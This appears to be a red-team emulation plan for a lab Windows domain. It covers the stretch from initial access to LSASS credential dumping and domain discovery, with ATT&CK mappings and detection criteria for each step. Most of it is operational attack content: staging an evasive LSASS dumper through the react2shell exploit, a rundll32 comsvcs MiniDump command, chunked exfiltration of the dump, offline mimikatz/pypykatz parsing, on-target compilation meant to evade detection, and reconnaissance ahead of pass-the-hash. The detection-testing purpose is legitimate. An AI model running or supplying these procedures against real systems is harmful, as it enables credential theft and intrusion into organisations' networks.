> Discovery, Credential Access

# Phase 2 - Discovery & Credential Access

## Overview

With `NT AUTHORITY\SYSTEM` command execution on `react.testlab.local` established
via the dnscat2 C2 session from Phase 1, the attacker pivots to credential access.
The objective is to acquire a minidump of the LSASS process from the IIS server,
which may contain cached domain account credentials, service account NTLM hashes,
or Kerberos tickets usable for further lateral movement.

The dump tool (`ReflectDump.exe`, staged under a generic system-sounding name) is
transferred to the IIS server via react2shell's eval-based chunked upload mechanism
- identical to the ingress path in Phase 1. Execution is performed from the
elevated dnscat2 C2 session (`NT AUTHORITY\SYSTEM`) to satisfy the binary's
privilege requirement. The resulting dump file is exfiltrated via react2shell's
chunked download command and parsed offline on the attacker machine.

---

## Step 1 - Credential Access: LSASS Memory Acquisition via Process Reflection

### Voice Track

Rather than opening a direct `PROCESS_ALL_ACCESS` handle on `lsass.exe` and
calling `MiniDumpWriteDump` against it - the classic pattern that most EDR sensors
alert on - the binary uses **`RtlCreateProcessReflection`** to clone the LSASS
process first. This undocumented API, exported from `ntdll.dll` and resolved at
runtime via a runtime-assembled char array to avoid static string matching, creates
a full process fork of LSASS in a suspended state under a new PID. The dump is
taken of the fork (the reflection), not of LSASS itself: the handle that triggers
`MiniDumpWriteDump` points to the reflection PID, a process that does not carry the
`lsass.exe` name and is not directly correlated with credential storage by
behaviour-based detectors.

A secondary evasion applies at the output layer. Rather than passing a file handle
directly to `MiniDumpWriteDump`, the binary registers a
`MINIDUMP_CALLBACK_INFORMATION` structure whose `IoWriteAllCallback` handler
(`DiagBufferCallback`) intercepts each I/O write and copies the bytes into a
global 75 MB heap-allocated in-memory buffer (`g_DiagBuffer`, allocated via
`HeapAlloc` at program initialization). The minidump is assembled entirely in
memory; a single `WriteFile` call then flushes the buffer to disk as `f.elif` - a
deliberately nondescript filename without the `.dmp` extension - in the process's
current working directory. Before `WriteFile` is called, the entire buffer is
XOR-encrypted in-place with a fixed single-byte key (`0x35`) via `XorBuffer`. The
bytes written to disk carry no recognisable MDMP magic, no readable PE headers
from loaded modules, and no credential string patterns - the file is opaque
binary noise to any static scanner. No dump data is streamed directly from LSASS
or its reflection to disk.

An `PROCESS_ALL_ACCESS` handle on LSASS is still required for
`RtlCreateProcessReflection`. The binary verifies an elevated session
(`IsElevatedSession`) as the first check in `main()` - if the token is not
elevated, it prints `[ERR] Insufficient privileges` and exits immediately with
return code -1. After the reflection is forked, the binary sleeps five seconds to
allow the clone's internal state to stabilise before invoking `MiniDumpWriteDump`.
The dump is written to the in-memory buffer via the callback, then XOR-encrypted
and flushed to disk via `WriteFile`. A second five-second sleep follows the disk
write. The binary then validates the output file exceeds 5 MB (`GetFileAttributesExA`
checks `nFileSizeLow < 1024 * 1024 * 5`) - if validation fails, it prints
`[ERR] Output size below threshold` and exits with return code 1. On success, the
binary opens a new handle to the reflection process with `PROCESS_TERMINATE`
access and terminates it via `TerminateProcess`, then exits with no stdout output.
Both the LSASS process name and the `RtlCreateProcessReflection` API name are
absent from the binary's static string table - each is assembled at runtime as a
`wchar_t` or `char` array.

Ingress transfer uses the same react2shell eval-based chunked upload as Phase 1,
but with an additional compression obfuscation layer (T1027.015): the binary is
compressed with gzip at maximum level (9) and base64-encoded in a single unwrapped
line before staging, reducing transfer size by ~62% and evading signature-based
detection of the raw PE. On the target, the compressed payload is decompressed
via Node.js built-in `zlib.gunzipSync` (no child process spawn), then the hidden
attribute is set via `attrib.exe +h` to reduce filesystem visibility (T1564.001)
before execution. Execution is performed from the elevated dnscat2 C2 shell (SYSTEM).
Exfiltration uses react2shell's `download` command, which reads `f.elif` in
8,192-byte chunks, base64-encodes each, and returns them in successive HTTP responses
for the attacker to capture and reassemble into the original dump.

### Setup

- ☣️ Build `ReflectDump.exe` from source on the attacker machine

  ```powershell
  msbuild resources\payloads\LsassReflectDumping\ReflectDump\ReflectDump.sln /p:Configuration=Release /p:Platform=x64 /m
  ```

  Output binary: `resources\payloads\LsassReflectDumping\ReflectDump\x64\Release\ReflectDump.exe`

- ☣️ Compress and encode `ReflectDump.exe` to gzip + base64 (T1027.015)

  ```bash
  cd resources/payloads/react2shell-tool
  python compress_payload.py ../LsassReflectDumping/ReflectDump/x64/Release/ReflectDump.exe -o WdiBoot.gz.b64 --b64 -l 0
  ```

  - ***Expected Output***

    ```text
    [+] Compression successful!
    [*] Original size: <size> bytes
    [*] Compressed size: <compressed_size> bytes
    [*] Compression ratio: ~62%
    [*] Output file: WdiBoot.gz.b64
    ```

### Procedures

- ☣️ Launch the react2shell interactive session against `react.testlab.local`

  ```bash
  cd resources/payloads/react2shell-tool
  python -m exploit_tool.main -t http://react.testlab.local
  ```

  - ***Expected Output***

    ```text
    [*] react2shell - CVE-2025-55182
    [*] Target: http://react.testlab.local
    rce >
    ```

- ☣️ Upload and decompress `ReflectDump.exe` to the IIS server (staged as `WdiBoot.exe`)

  ```
  rce > upload WdiBoot.gz.b64 C:\Windows\Temp\WdiBoot.gz.b64
  rce > decode C:\Windows\Temp\WdiBoot.gz.b64 C:\Windows\Temp\WdiBoot.gz
  rce > decompress C:\Windows\Temp\WdiBoot.gz C:\Windows\Temp\WdiBoot.bin
  rce > rename C:\Windows\Temp\WdiBoot.bin C:\Windows\Temp\WdiBoot.exe
  rce > hide C:\Windows\Temp\WdiBoot.exe
  ```

  - ***Expected Output***

    ```text
    [*] Uploading WdiBoot.gz.b64 via eval (NO spawn - STEALTH!)...
    [+] File uploaded successfully -> C:\Windows\Temp\WdiBoot.gz.b64 (NO process spawn!)
    [*] Decoding C:\Windows\Temp\WdiBoot.gz.b64 -> C:\Windows\Temp\WdiBoot.gz via eval (NO spawn - STEALTH!)...
    [+] File decoded successfully -> C:\Windows\Temp\WdiBoot.gz (NO process spawn!)
    [*] Decompressing C:\Windows\Temp\WdiBoot.gz -> C:\Windows\Temp\WdiBoot.bin via eval (NO spawn - STEALTH!)...
    [+] File decompressed successfully -> C:\Windows\Temp\WdiBoot.bin (NO process spawn!)
    [*] T1027.015 - Obfuscated Files or Information: Compression
    [+] File renamed successfully -> C:\Windows\Temp\WdiBoot.exe (NO process spawn!)
    [*] Setting hidden attribute on C:\Windows\Temp\WdiBoot.exe (spawns attrib.exe - OBSERVABLE!)...
    [+] Hidden attribute set on C:\Windows\Temp\WdiBoot.exe (attrib.exe spawned)
    [*] Detection: node.exe spawns attrib.exe with arguments ['+h', 'C:\Windows\Temp\WdiBoot.exe']
    ```

- ☣️ From the elevated dnscat2 C2 session (SYSTEM), navigate to `C:\Windows\Temp` and execute `WdiBoot.exe`

  ```text
  command (iis-server) 1> shell
  C:\Windows\system32> cd C:\Windows\Temp
  C:\Windows\Temp> WdiBoot.exe
  ```

  - ***Expected Output***

    ```text
    (no stdout output - process runs for approximately 10 seconds and exits cleanly on success)
    ```

- ☣️ Verify `f.elif` was created and exceeds the 5 MB validation threshold

  ```text
  C:\Windows\Temp> dir f.elif
  ```

  - ***Expected Output***

    ```text
    Directory of C:\Windows\Temp

    <date>  <time>    <size> f.elif
                   1 File(s)    <size> bytes
    ```

    File size will be in the tens to hundreds of MB depending on LSASS working set at dump time.

- ☣️ Back in the react2shell session, download `f.elif` - the client decodes each chunk
  and writes raw binary directly; no separate decode step needed

  ```
  rce > download C:\Windows\Temp\f.elif
  ```

  - ***Expected Output***

    ```text
    [*] Downloading C:\Windows\Temp\f.elif (XXXXXXX bytes) in XXXX chunk(s) via eval (NO spawn - STEALTH!)...
    [*] Progress: 100/XXXX chunks (819200/XXXXXXX bytes)
    [*] Progress: 200/XXXX chunks ...
    ...
    [+] File saved to: downloaded_f.elif (XXXXXXX bytes, NO process spawn!)
    ```

  - ***If EPERM error occurs*** - `f.elif` was created by SYSTEM and the AppPool identity
    lacks read access to files it did not create in `C:\Windows\Temp`. From the SYSTEM C2
    shell, copy the dump to the IIS application root (`C:\inetpub\react.testlab.local`),
    which the AppPool identity can read:

    ```text
    C:\Windows\Temp> copy f.elif C:\inetpub\react.testlab.local\f.elif
    ```

    Then retry in the react2shell session:

    ```
    rce > download C:\inetpub\react.testlab.local\f.elif
    ```

    Remove the staging copy from the app root after download (SYSTEM C2):

    ```text
    C:\> del C:\inetpub\react.testlab.local\f.elif
    ```

- ☣️ XOR-decrypt `downloaded_f.elif` on the attacker machine - output is `lsass.dmp`

  ```bash
  python -c "data=open('downloaded_f.elif','rb').read(); open('lsass.dmp','wb').write(bytes(b^0x35 for b in data))"
  ```

- ☣️ Parse credentials offline

  ```bash
  pypykatz lsa minidump lsass.dmp
  ```

  OR

  ```text
  mimikatz # sekurlsa::minidump lsass.dmp
  mimikatz # sekurlsa::logonPasswords full
  ```

  - ***Expected Output***

    ```text
    [+] NT hashes / Kerberos tickets / plaintext credentials for domain accounts cached on the IIS server
    ```

### Reference Tables

| Tactic | Technique ID | Technique Name | Platform | Detection Criteria | Category | Red Team Activity | Hosts | Users | Source Code Links | Relevant CTI Reports
|  - | - | - | - | - | - | - | - | - | - | -
| Command and Control | T1105 | Ingress Tool Transfer | Windows | Sequential POST requests to `react.testlab.local` RSC endpoint appending 2,000-char base64 blocks to `C:\Windows\Temp\WdiBoot.gz.b64` via eval-based `fs.appendFileSync`; no child process spawned | Not Calibrated - Not Benign | react2shell `upload` command stages compressed+encoded `ReflectDump.exe` (as `WdiBoot.gz.b64`) to IIS server in chunks; identical eval-based chunked path to Phase 1 - already scored in Phase 1 Step 3 (same host, same actor, same mechanism) | react.testlab.local | IIS APPPOOL\react.testlab.local | [file_ops.py upload()](../../resources/payloads/react2shell-tool/exploit_tool/commands/file_ops.py) | -
| Defense Evasion | T1027.015 | Obfuscated Files or Information: Compression | Windows | `node.exe` reads `C:\Windows\Temp\WdiBoot.gz.b64`, decompresses via `zlib.gunzipSync`, writes `C:\Windows\Temp\WdiBoot.exe` on react.testlab.local | Calibrated - Not Benign | react2shell `decompress` command decompresses gzip-compressed payload using built-in Node.js `zlib` module; compression reduces transfer size by ~62% and evades signature-based detection of raw PE structure during upload; decompression occurs via eval-based `fs.writeFileSync(out, zlib.gunzipSync(fs.readFileSync(in)))` | react.testlab.local | IIS APPPOOL\react.testlab.local | [file_ops.py decompress()](../../resources/payloads/react2shell-tool/exploit_tool/commands/file_ops.py), [compress_payload.py](../../resources/payloads/react2shell-tool/compress_payload.py) | -
| Defense Evasion | T1564.001 | Hide Artifacts: Hidden Files and Directories | Windows | `node.exe` spawns `attrib.exe` with arguments `['+h', 'C:\Windows\Temp\WdiBoot.exe']` on react.testlab.local | Calibrated - Not Benign | react2shell `hide` command sets Windows hidden attribute on staged credential dumping tool to reduce filesystem visibility; spawns `attrib.exe +h` via `child_process.spawnSync` - intentionally observable process creation for Calibrated detection; Node.js `fs.chmod` only supports Unix permissions, not Windows attributes, requiring external binary spawn | react.testlab.local | IIS APPPOOL\react.testlab.local | [file_ops.py hide()](../../resources/payloads/react2shell-tool/exploit_tool/commands/file_ops.py) | -
| Discovery | T1057 | Process Discovery | Windows | `CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0)` + `Process32NextW` loop issued by `WdiBoot.exe` to locate LSASS PID; target name `lsass.exe` absent from binary strings | Calibrated - Not Benign | `QueryProcessEntry()` enumerates all running processes via toolhelp snapshot to obtain lsass PID; process name assembled at runtime as a `wchar_t` array | react.testlab.local | NT AUTHORITY\SYSTEM | [Source.cpp QueryProcessEntry()](../../resources/payloads/LsassReflectDumping/ReflectDump/ReflectDump/Source.cpp) | -
| Credential Access | T1003.001 | OS Credential Dumping: LSASS Memory | Windows | `WdiBoot.exe` invokes `RtlCreateProcessReflection` to clone `lsass.exe` and writes an XOR-encrypted minidump to `C:\Windows\Temp\f.elif` | Calibrated - Not Benign | ReflectDump forks LSASS via `RtlCreateProcessReflection`, dumps the fork via `MiniDumpWriteDump` with `IoWriteAllCallback` into 75 MB heap buffer, XOR-encrypts buffer in-place with key `0x35` via `XorBuffer`, then flushes to `f.elif`; reflection terminated after dump | react.testlab.local | NT AUTHORITY\SYSTEM | [Source.cpp main()](../../resources/payloads/LsassReflectDumping/ReflectDump/ReflectDump/Source.cpp) | -
| Defense Evasion | T1027.013 | Obfuscated Files or Information: Encrypted/Encoded File | Windows | `WdiBoot.exe` writes `C:\Windows\Temp\f.elif` with entire minidump buffer XOR-encrypted using single-byte key `0x35`; file on disk contains no MDMP magic bytes or recognisable credential strings - appears as opaque binary noise to static scanners | Calibrated - Not Benign | ReflectDump XOR-encrypts entire 75 MB dump buffer in-place via `XorBuffer` with hardcoded key `0x35` before `WriteFile`; encryption applied to obfuscate LSASS memory dump content and evade signature-based detection of minidump format | react.testlab.local | NT AUTHORITY\SYSTEM | [Source.cpp XorBuffer()](../../resources/payloads/LsassReflectDumping/ReflectDump/ReflectDump/Source.cpp) | -
| Defense Evasion | T1027.007 | Obfuscated Files or Information: Dynamic API Resolution | Windows | `WdiBoot.exe` (ReflectDump) contains no static string or import reference to `RtlCreateProcessReflection` or `lsass.exe`; both assembled at runtime as character arrays; no IAT entry for the undocumented API; `RtlCreateProcessReflection` resolved via runtime `GetProcAddress` call | Not Calibrated - Not Benign | ReflectDump assembles the name `RtlCreateProcessReflection` as a runtime `char` array and passes it to `GetProcAddress`; LSASS target name built as a runtime `wchar_t` array - both strings absent from binary's static string table and import table, defeating IAT and string-based detection | react.testlab.local | NT AUTHORITY\SYSTEM | [Source.cpp main()](../../resources/payloads/LsassReflectDumping/ReflectDump/ReflectDump/Source.cpp) | -
| Defense Evasion | T1036.005 | Masquerading: Match Legitimate Resource Name or Location | Windows | PE at `C:\Windows\Temp\WdiBoot.exe`; output artefact at `C:\Windows\Temp\f.elif` lacks `.dmp` extension | Calibrated - Not Benign | ReflectDump staged as `WdiBoot.exe` (mimics Windows Diagnostics Infrastructure component); dump written as `f.elif` to suppress extension-based detection rules | react.testlab.local | NT AUTHORITY\SYSTEM | [Source.cpp main()](../../resources/payloads/LsassReflectDumping/ReflectDump/ReflectDump/Source.cpp) | -
| Exfiltration | T1030 | Data Transfer Size Limits | Windows | `node.exe` transmits the contents of `f.elif` via multiple 8,192-byte HTTP POST responses to the attacker | Calibrated - Not Benign | react2shell `download` command exfiltrates `f.elif` as base64 in 8,192-byte chunks over successive HTTP responses | react.testlab.local | IIS APPPOOL\react.testlab.local | [file_ops.py download()](../../resources/payloads/react2shell-tool/exploit_tool/commands/file_ops.py) | -
| Defense Evasion | T1678 | Delay Execution | Windows | `WdiBoot.exe` (`ReflectDump`) process runtime is approximately 10 seconds with no stdout output; two `Sleep(5000)` calls visible as sustained CPU-idle waits in process telemetry: first sleep occurs after `RtlCreateProcessReflection` (line 165), second sleep occurs after `WriteFile` (line 194); binary exits cleanly only after output file size validation passes | Not Calibrated - Not Benign | `ReflectDump` sleeps 5 seconds after forking the LSASS reflection via `RtlCreateProcessReflection` (allowing clone internal state to stabilize before `MiniDumpWriteDump`), then sleeps a second 5 seconds after `WriteFile` flushes the XOR-encrypted buffer to disk (before validating `f.elif` size and terminating the reflection); deliberate delays reduce the likelihood of behavioral detections triggered by rapid process-create → dump → exit sequences | react.testlab.local | NT AUTHORITY\SYSTEM | [Source.cpp main()](../../resources/payloads/LsassReflectDumping/ReflectDump/ReflectDump/Source.cpp) | -

---

> **Optional Step** — Alternative LSASS acquisition via `rundll32.exe` + `comsvcs.dll MiniDump`. Execute in addition to or instead of Step 1 to exercise a distinct detection rule family. This method is more widely detected than the `RtlCreateProcessReflection` approach and is flagged by most EDR products — proceed only if testing the `comsvcs.dll MiniDump` detection chain is an explicit objective for this run.

## Step 1.5 — Alternative Credential Access: LSASS Dump via Rundll32 + comsvcs.dll (Optional)

### Voice Track

As an alternative or supplementary LSASS acquisition technique, the attacker invokes
`rundll32.exe` to proxy execution of the `MiniDump` function exported from
`comsvcs.dll` — the most widely deployed LSASS dump method across CaaS ransomware
families including Conti, BlackBasta, and BlackSuit. Unlike the
`RtlCreateProcessReflection`-based Step 1, which forks LSASS into a clone before
dumping the fork, this approach opens a direct `PROCESS_ALL_ACCESS` handle to the
live `lsass.exe` process and passes it to `comsvcs.dll`'s `MiniDumpWriteDump`
implementation via the `MiniDump` export.

The resulting dump is a standard Windows minidump with intact MDMP magic bytes —
more visible to static scanners than the XOR-encrypted `f.elif` of Step 1, but
useful for testing whether the product detects the LSASS handle-open event before
the file write occurs. The two steps produce independent detection chain signals:
`RtlCreateProcessReflection` vs `PROCESS_ALL_ACCESS` handle to `lsass.exe`, and
`f.elif` (no MDMP header) vs `g.dmp` (valid minidump). Running both in the same
session exercises two separate rule families.

### Procedures

- Obtain the LSASS PID from the SYSTEM dnscat2 shell

  ```text
  C:\Windows\Temp> powershell -NoProfile -Command "(Get-Process lsass).Id"
  ```

  - ***Expected Output***

    ```text
    <lsass_pid>
    ```

- ☣️ Invoke `rundll32.exe` to dump LSASS memory via `comsvcs.dll MiniDump`

  ```text
  C:\Windows\Temp> rundll32.exe C:\Windows\System32\comsvcs.dll MiniDump <lsass_pid> C:\Windows\Temp\g.dmp full
  ```

  - ***Expected Output***

    ```text
    (no console output — rundll32.exe returns silently on success)
    ```

- Verify the dump file was created

  ```text
  C:\Windows\Temp> dir g.dmp
  ```

  - ***Expected Output***

    ```text
     Directory of C:\Windows\Temp

    <date>  <time>    <size> g.dmp
                   1 File(s)    <size> bytes
    ```

    File size will be in the tens to hundreds of MB depending on LSASS working set.

- ☣️ Download the dump file via react2shell for offline parsing

  ```
  rce > download C:\Windows\Temp\g.dmp
  ```

  - ***Expected Output***

    ```text
    [*] Downloading C:\Windows\Temp\g.dmp (XXXXXXX bytes) in XXXX chunk(s) via eval (NO spawn - STEALTH!)...
    ...
    [+] File saved to: downloaded_g.dmp (XXXXXXX bytes, NO process spawn!)
    ```

- ☣️ Parse credentials offline

  ```bash
  pypykatz lsa minidump downloaded_g.dmp
  ```

  - ***Expected Output***

    ```text
    [+] NT hashes / Kerberos tickets / plaintext credentials for domain accounts cached on the IIS server
    ```

### Reference Tables

| Tactic | Technique ID | Technique Name | Platform | Detection Criteria | Category | Red Team Activity | Hosts | Users | Source Code Links | Relevant CTI Reports |
| - | - | - | - | - | - | - | - | - | - | - |
| Defense Evasion | T1218.011 | System Binary Proxy Execution: Rundll32 | Windows | Sysmon Event 1 on IIS01: `rundll32.exe C:\Windows\System32\comsvcs.dll MiniDump <lsass_pid> C:\Windows\Temp\g.dmp full` spawned from `RuntimeBroker.exe` ghost (NT AUTHORITY\SYSTEM); Sysmon Event 10: `rundll32.exe` opens handle to `lsass.exe` with `PROCESS_ALL_ACCESS` | Calibrated - Not Benign | `rundll32.exe` proxies `comsvcs.dll`'s `MiniDump` export to write a full LSASS minidump to `C:\Windows\Temp\g.dmp` — alternative to the `RtlCreateProcessReflection`-based Step 1; tests the `comsvcs.dll MiniDump` detection chain used by Conti, BlackBasta, and BlackSuit | IIS01 (10.12.10.20) | NT AUTHORITY\SYSTEM | - | - |
| Credential Access | T1003.001 | OS Credential Dumping: LSASS Memory | Windows | Sysmon Event 11 on IIS01: `rundll32.exe` creates `C:\Windows\Temp\g.dmp` containing MDMP magic bytes; Sysmon Event 10: `PROCESS_ALL_ACCESS` handle opened to `lsass.exe` by `rundll32.exe` (child of `RuntimeBroker.exe` ghost, NT AUTHORITY\SYSTEM) | Calibrated - Not Benign | `comsvcs.dll MiniDump` dumps full LSASS working set to `g.dmp` via `rundll32.exe` — distinct from Step 1's XOR-encrypted `f.elif`; dump contains plaintext credentials, NTLM hashes, and Kerberos tickets for domain accounts cached on IIS01 | IIS01 (10.12.10.20) | NT AUTHORITY\SYSTEM | - | - |

---

> **Optional Step** — Compile-after-delivery alternative for AV discovery. Delivers `WmiQuery.cs` (C# source with dead code insertions for T1027.016) to IIS01 via react2shell, then compiles on the target host using `csc.exe` (T1027.004). The compiled binary performs WMI-based AV enumeration — same objective as `WmiAvQuery.exe` in Step 2 but via on-target compilation. Execute in addition to the WmiAvQuery.exe step, not in place of it. Note: `ROOT\SecurityCenter2` is unavailable on Windows Server 2022 — the query will return an error (expected). Run to exercise the T1027.004 detection chain, not for functional AV output.

## Step 1.7 — Defense Evasion: Compile-After-Delivery with Junk Code Insertion (Optional, T1027.004 + T1027.016)

### Voice Track

As an optional evasion demonstration, the attacker delivers a C# source file (`WmiQuery.cs`) to the IIS server via react2shell rather than a pre-compiled PE binary. The source file intentionally contains dead code insertions — an unused constant (`kPad`), a never-called method (`Stub`), and a discarded computation (`kPad >> 1`) — to increase per-sample entropy and complicate static analysis of the staged artifact prior to compilation (T1027.016). Because the file at rest is plaintext C# source rather than a PE, byte-level signature detection cannot match against it during upload.

On the target host, the attacker invokes the .NET Framework `csc.exe` compiler from the SYSTEM dnscat2 shell to compile the source into a PE executable. The compiler binary (`csc.exe`) is a native Windows component present in all .NET Framework 4.x installations, requiring no external tooling. This compile-after-delivery pattern avoids staging a pre-built binary entirely — a source file exhibits no PE structure, no import table, and no suspicious entropy profile on disk. The resulting binary performs WMI-based security software discovery, querying `ROOT\SecurityCenter2` via `ManagementObjectSearcher`.

### Setup

- Ensure `WmiQuery.cs` is present in the `resources/payloads/WmiAvQuery/` directory:

  ```
  resources\payloads\WmiAvQuery\WmiQuery.cs
  ```

- ☣️ Base64-encode `WmiQuery.cs` for react2shell upload (from the attacker machine)

  ```bash
  cd resources/payloads/react2shell-tool
  python -c "import base64; open('WmiQuery.b64','wb').write(base64.b64encode(open('../WmiAvQuery/WmiQuery.cs','rb').read()))"
  ```

  - ***Expected Output***

    ```text
    (no output — WmiQuery.b64 created in resources/payloads/react2shell-tool/)
    ```

### Procedures

- ☣️ Upload and decode `WmiQuery.cs` to the IIS server via the react2shell session

  ```
  rce > upload WmiQuery.b64 C:\Windows\Temp\WmiQuery.b64
  rce > decode C:\Windows\Temp\WmiQuery.b64 C:\Windows\Temp\WmiQuery.cs
  ```

  - ***Expected Output***

    ```text
    [*] Uploading WmiQuery.b64 via eval (NO spawn - STEALTH!)...
    [+] File uploaded successfully -> C:\Windows\Temp\WmiQuery.b64 (NO process spawn!)
    [+] File decoded successfully -> C:\Windows\Temp\WmiQuery.cs (NO process spawn!)
    ```

- ☣️ From the elevated dnscat2 C2 session (SYSTEM), compile `WmiQuery.cs` on the target host

  ```text
  C:\Windows\Temp> C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe /out:C:\Windows\Temp\WmiQuery.exe C:\Windows\Temp\WmiQuery.cs /r:C:\Windows\Microsoft.NET\Framework64\v4.0.30319\System.Management.dll
  ```

  - ***Expected Output***

    ```text
    Microsoft (R) Visual C# Compiler version 4.x.xxxxx.x
    Copyright (C) Microsoft Corporation. All rights reserved.
    ```

    One or two "unused variable" or "unused method" warnings may appear — these do not prevent successful compilation.

- ☣️ Execute the compiled binary

  ```text
  C:\Windows\Temp> WmiQuery.exe
  ```

  - ***Expected Output (Windows Server — ROOT\SecurityCenter2 unavailable)***

    ```text
    [!] Invalid namespace
    ```

    The error is expected on Windows Server 2022. To confirm `csc.exe` compiled the binary successfully:

    ```text
    C:\Windows\Temp> dir WmiQuery.exe
    ```

### Reference Tables

| Tactic | Technique ID | Technique Name | Platform | Detection Criteria | Category | Red Team Activity | Hosts | Users | Source Code Links | Relevant CTI Reports |
| - | - | - | - | - | - | - | - | - | - | - |
| Defense Evasion | T1027.004 | Obfuscated Files or Information: Compile After Delivery | Windows | `RuntimeBroker.exe` (ghost process, NT AUTHORITY\SYSTEM) spawns `cmd.exe` which executes `csc.exe /out:C:\Windows\Temp\WmiQuery.exe C:\Windows\Temp\WmiQuery.cs /r:...System.Management.dll` on IIS01 (Sysmon Event 1) | Calibrated - Not Benign | `csc.exe` compiles `WmiQuery.cs` — delivered as plaintext source to IIS01 — into a PE executable on the target host; source delivery avoids static PE signature matching during ingress; compilation occurs entirely on the target using the built-in .NET Framework compiler | IIS01 (10.12.10.20) | NT AUTHORITY\SYSTEM | [WmiQuery.cs](../../resources/payloads/WmiAvQuery/WmiQuery.cs) | - |
| Defense Evasion | T1027.016 | Obfuscated Files or Information: Junk Code Insertion | Windows | Dead code in `WmiQuery.cs`: unreachable `Stub()` method and discarded `kPad >> 1` computation are syntactically valid C# but produce no runtime effect — not independently distinguishable from functional code via standard EDR telemetry | Not Calibrated - Not Benign | `WmiQuery.cs` contains dead code insertions — unused constant `kPad`, never-called `Stub()` method, and discarded `unused` variable — to increase per-sample entropy and complicate static analysis of the source file; dead code is indistinguishable from live logic in pre-compilation source without semantic analysis | IIS01 (10.12.10.20) | NT AUTHORITY\SYSTEM | [WmiQuery.cs](../../resources/payloads/WmiAvQuery/WmiQuery.cs) | - |

---

## Step 2 - Discovery: Host & Domain Reconnaissance

### Voice Track

With SYSTEM-level code execution established and credential material recovered from
the LSASS dump, the attacker performs targeted host and domain reconnaissance before
proceeding to lateral movement.

The first priority is to profile installed security software. `WmiAvQuery.exe` — a
custom lightweight C++ binary — is staged to `C:\Windows\Temp` via the existing
react2shell upload path and executed under the SYSTEM context. It queries
`ROOT\SecurityCenter2` via WMI COM APIs (`IWbemLocator` → `IWbemServices::ExecQuery`
with WQL `SELECT * FROM AntiVirusProduct`), returning the display name, instance GUID,
paths, and product state of every registered antivirus product. On Windows Server
systems where `SecurityCenter2` is unavailable, the tool transparently falls back to
`ROOT\Microsoft\Windows\Defender` namespace, querying `MSFT_MpComputerStatus` to obtain
antivirus state, real-time protection status, and product version. This gives the
attacker a precise picture of the endpoint protection posture before performing more
visible discovery activity.

The remaining discovery steps rely solely on commands available natively on the IIS
server. `whoami /all` confirms the SYSTEM token and privilege set. `nltest /dsgetdc:`
returns the Domain Controller hostname, IP, and role flags. `net group "Domain Admins"
/domain` and `net user /domain` enumerate domain group membership and accounts —
confirming which hashes from the LSASS dump are high-value targets. `net view \\DC01`
probes whether the DC's admin shares are accessible over SMB from IIS01, a direct
prerequisite for Pass-the-Hash lateral movement in Phase 3.

### Procedures

- ☣️ In the react2shell session (from Step 4, still open), upload and decode `WmiAvQuery.exe` to the IIS server

  ```
  rce > upload WmiAvQuery.b64 C:\Windows\Temp\WmiAvQuery.b64
  rce > decode C:\Windows\Temp\WmiAvQuery.b64 C:\Windows\Temp\WmiAvQuery.bin
  rce > rename C:\Windows\Temp\WmiAvQuery.bin C:\Windows\Temp\WmiAvQuery.exe
  ```

  - ***Expected Output***

    ```text
    [*] Uploading WmiAvQuery.b64 via eval (NO spawn - STEALTH!)...
    [+] File uploaded successfully (NO process spawn!)
    [+] File decoded successfully (NO process spawn!)
    ```

- ☣️ From the elevated dnscat2 C2 session (SYSTEM), execute `WmiAvQuery.exe` to enumerate installed security software

  ```text
  C:\Windows\Temp> WmiAvQuery.exe
  ```

  - ***Expected Output (Windows Client - SecurityCenter2)***

    ```text
    [*] Querying installed Antivirus products using WMI COM API...

    === Antivirus Product #1 ===
      displayName: <AV product name>
      instanceGuid: {<guid>}
      pathToSignedProductExe: <path>
      pathToSignedReportingExe: <path>
      productState: 0x<state>
      Product State (Raw): 0x<state>
      Status: ENABLED
      Definitions: UP-TO-DATE

    [+] Total antivirus products found: 1

    [*] Query completed.
    ```

  - ***Expected Output (Windows Server - Defender WMI fallback)***

    ```text
    [*] Querying installed Antivirus products using WMI COM API...

    [!] Could not connect to ROOT\SecurityCenter2 namespace. Error code: 0x8004100e
    [*] This is expected on Windows Server. Attempting fallback...
    [!] Could not connect to ROOT\SecurityCenter namespace either. Error code: 0x8004100e
    [*] Falling back to Windows Defender WMI query...
    [+] Connected to ROOT\Microsoft\Windows\Defender namespace

    === Antivirus Product #1 ===
      displayName: Windows Defender Antivirus
      instanceGuid: {D68DDC3A-831F-4fae-9E44-DA132C1ACF46}
      pathToSignedProductExe: C:\Program Files\Windows Defender\MsMpEng.exe
      pathToSignedReportingExe: C:\Program Files\Windows Defender\MpCmdRun.exe
      productVersion: 4.18.26030.3011
      productState: 0x001000
      Product State (Raw): 0x001000
      Status: ENABLED
      Real-Time Protection: ENABLED
      Signature Last Updated: 20260519230814.000000+000

    [+] Total antivirus products found: 1

    [*] Query completed (via WMI fallback).
    ```

- ☣️ From the elevated dnscat2 C2 session (SYSTEM), confirm the SYSTEM token and privileges

  ```text
  C:\Windows\Temp> whoami /all
  ```

  - ***Expected Output***

    ```text
    USER INFORMATION
    ----------------
    User Name           SID
    =================== ========
    nt authority\system S-1-5-18

    GROUP INFORMATION
    -----------------
    ...
    Mandatory Label\System Mandatory Level  Label  S-1-16-16384

    PRIVILEGES INFORMATION
    ----------------------
    Privilege Name                            State
    ========================================= =======
    SeAssignPrimaryTokenPrivilege             Enabled
    SeDebugPrivilege                          Enabled
    ...
    ```

- ☣️ From the elevated dnscat2 C2 session (SYSTEM), query the Netlogon service for DC info

  ```text
  C:\Windows\Temp> nltest /dsgetdc:TESTLAB
  ```

  - ***Expected Output***

    ```text
               DC: \\DC01
          Address: \\10.12.10.10
         Dom Guid: <guid>
         Dom Name: TESTLAB
      Forest Name: testlab.local
     Dc Site Name: Default-First-Site-Name
    Our Site Name: Default-First-Site-Name
            Flags: PDC GC DS LDAP KDC TIMESERV GTIMESERV WRITABLE DNS_FOREST CLOSE_SITE FULL_SECRET WS DS_8 DS_9 DS_10 KEYLIST
    The command completed successfully
    ```

- ☣️ Enumerate Domain Admins group and domain user accounts

  ```text
  C:\Windows\Temp> net group "Domain Admins" /domain
  C:\Windows\Temp> net user /domain
  ```

  - ***Expected Output (`net group`)***

    ```text
    Group name     Domain Admins
    Members
    -------------------------------------------------------------------------------
    Administrator
    ```

- ☣️ Verify DC admin shares are reachable over SMB (precursor to Pass-the-Hash)

  ```text
  C:\Windows\Temp> net view \\DC01
  ```

  - ***Expected Output***

    ```text
    Shared resources at \\DC01

    Share name  Type  Used as  Comment
    -------------------------------------------------------------------------------
    ADMIN$      Disk           Remote Admin
    C$          Disk           Default share
